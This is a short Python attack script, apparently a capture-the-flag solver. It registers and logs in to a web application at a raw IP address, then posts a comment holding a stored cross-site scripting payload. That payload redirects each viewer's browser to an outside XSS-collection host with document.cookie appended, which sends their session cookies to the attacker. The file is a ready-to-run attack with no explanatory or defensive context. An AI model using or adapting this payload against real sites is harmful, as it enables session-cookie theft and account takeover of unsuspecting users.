#!/usr/bin/python3
import requests


url = "http://101.37.32.116:20212/"

username = "1234"
xss_url = "https://xsshs.cn/rZTR/xss.jpg"
payload = '<script>window.location.href="{}?"+document.cookie</script>'.format(xss_url)

s = requests.session()

def register():
	data ={
		"username": username,
		"password": "las"
	}
	s.post(url=url+"register", data=data)

def login():
	data = {
		"username": username,
		"password": "las"
	}
	s.post(url=url+"login", data=data)

def send():
	data = {
		"comment": payload
	}
	s.post(url=url+"message", data=data)


if __name__ == "__main__":
	register()
	login()
	send()
	print("done")
